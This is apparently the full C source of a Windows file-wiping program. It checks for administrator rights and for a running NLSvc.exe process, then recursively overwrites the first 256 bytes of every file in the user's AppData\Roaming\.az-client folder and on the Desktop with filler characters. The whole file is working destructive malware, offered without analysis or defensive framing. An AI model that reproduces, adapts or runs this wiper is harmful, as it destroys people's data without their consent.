#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <securitybaseapi.h>
#include <Lmcons.h>
#include <tlhelp32.h>

// Define paths
#define C_USER      "C:\\Users\\"
#define C_APPDATA   "\\AppData\\Roaming\\.az-client"
#define DESKTOP     "\\Desktop"
#define NLSVC       "NLSvc.exe"

// Prototypes
static void cleanup_and_exit(int exit_code);
static BOOL check_elevation(void);
static BOOL check_nlsvc(void);
static char* get_username(void);
static char* build_path(const char* base_path, const char* username, const char* suffix);
static void rewriter(const char* dir);

int main(void)
{
    printf("[INFO] Starting program...\n");

    // Create a mutex to ensure only one instance is running
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "LittleRedBird");
    if (!hMutex) {
        printf("[ERROR] Failed to create mutex. Exiting program.\n");
        cleanup_and_exit(EXIT_FAILURE);
    }

    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        printf("[ERROR] Another instance is already running. Exiting program.\n");
        CloseHandle(hMutex);
        cleanup_and_exit(EXIT_FAILURE);
    }

    // Check if the process has administrator privileges
    if (!check_elevation()) {
        printf("[ERROR] Administrator privileges are required to run this program.\n");
        CloseHandle(hMutex);
        cleanup_and_exit(EXIT_FAILURE);
    }
    printf("[INFO] Administrator privileges confirmed.\n");

    // Check if NLSvc.exe is running
    if (!check_nlsvc()) {
        printf("[ERROR] NLSvc.exe is not running. Exiting program.\n");
        CloseHandle(hMutex);
        cleanup_and_exit(EXIT_FAILURE);
    }
    printf("[INFO] NLSvc.exe is running.\n");

    // Get the username and construct paths
    char* username = get_username();
    if (!username) {
        printf("[ERROR] Failed to retrieve the username. Exiting program.\n");
        CloseHandle(hMutex);
        cleanup_and_exit(EXIT_FAILURE);
    }
    printf("[INFO] Username retrieved: %s\n", username);

    char* az_folder = build_path(C_USER, username, C_APPDATA);
    char* user_desktop = build_path(C_USER, username, DESKTOP);

    if (!az_folder || !user_desktop) {
        printf("[ERROR] Failed to construct required paths. Exiting program.\n");
        free(az_folder);
        free(user_desktop);
        CloseHandle(hMutex);
        cleanup_and_exit(EXIT_FAILURE);
    }
    printf("[INFO] Paths constructed successfully.\n");

    // Check if the az_folder exists
    DWORD ftyp = GetFileAttributesA(az_folder);
    if (ftyp == INVALID_FILE_ATTRIBUTES || !(ftyp & FILE_ATTRIBUTE_DIRECTORY)) {
        printf("[ERROR] Folder %s does not exist or is not accessible.\n", az_folder);
        free(az_folder);
        free(user_desktop);
        CloseHandle(hMutex);
        cleanup_and_exit(EXIT_FAILURE);
    }
    printf("[INFO] Folder %s exists.\n", az_folder);

    // Overwrite files in az_folder and desktop recursively
    printf("[INFO] Starting file rewriting in %s...\n", az_folder);
    rewriter(az_folder);
    printf("[INFO] Completed file rewriting in %s.\n", az_folder);

    printf("[INFO] Starting file rewriting on desktop: %s...\n", user_desktop);
    rewriter(user_desktop);
    printf("[INFO] Completed file rewriting on desktop: %s.\n", user_desktop);

    // Free resources
    free(az_folder);
    free(user_desktop);
    CloseHandle(hMutex);

    // Normal program termination
    printf("[INFO] Program completed successfully.\n");
    cleanup_and_exit(EXIT_SUCCESS);
}

static void cleanup_and_exit(int exit_code)
{
    printf("[INFO] Exiting program with code %d.\n", exit_code);
    exit(exit_code);
}

static BOOL check_elevation(void)
{
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);

        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    if (!fRet) {
        printf("[ERROR] Failed to confirm elevated privileges.\n");
    }

    return fRet;
}

static BOOL check_nlsvc(void)
{
    BOOL found = FALSE;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[ERROR] Failed to create process snapshot.\n");
        return FALSE;
    }

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &entry)) {
        do {
            if (_stricmp(entry.szExeFile, NLSVC) == 0) {
                found = TRUE;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }

    if (!found) {
        printf("[ERROR] Process %s not found.\n", NLSVC);
    }

    CloseHandle(snapshot);
    return found;
}

static char* get_username(void)
{
    static char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;

    if (!GetUserNameA(username, &username_len)) {
        printf("[ERROR] Failed to retrieve username.\n");
        return NULL;
    }
    return username;
}

static char* build_path(const char* base_path, const char* username, const char* suffix)
{
    size_t size = strlen(base_path) + strlen(username) + strlen(suffix) + 1;
    char* result = (char*)malloc(size);
    if (!result) {
        printf("[ERROR] Memory allocation failed for path construction.\n");
        return NULL;
    }
    sprintf_s(result, size, "%s%s%s", base_path, username, suffix);
    return result;
}

static void rewriter(const char* dir)
{
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind;
    char path[MAX_PATH];
    char buffer[256];

    memset(buffer, 'I', sizeof(buffer));
    sprintf_s(path, sizeof(path), "%s\\*", dir);

    hFind = FindFirstFileA(path, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("[ERROR] Failed to access directory: %s\n", dir);
        return;
    }

    do {
        if (findFileData.cFileName[0] == '.') {
            continue;
        }

        char fullPath[MAX_PATH];
        sprintf_s(fullPath, sizeof(fullPath), "%s\\%s", dir, findFileData.cFileName);

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            rewriter(fullPath);
        } else {
            FILE* file = fopen(fullPath, "r+b");
            if (file) {
                fwrite(buffer, 1, sizeof(buffer), file);
                fclose(file);
                printf("[INFO] Rewritten file: %s\n", fullPath);
            } else {
                printf("[ERROR] Failed to open file: %s\n", fullPath);
            }
        }
    } while (FindNextFileA(hFind, &findFileData));

    FindClose(hFind);
}
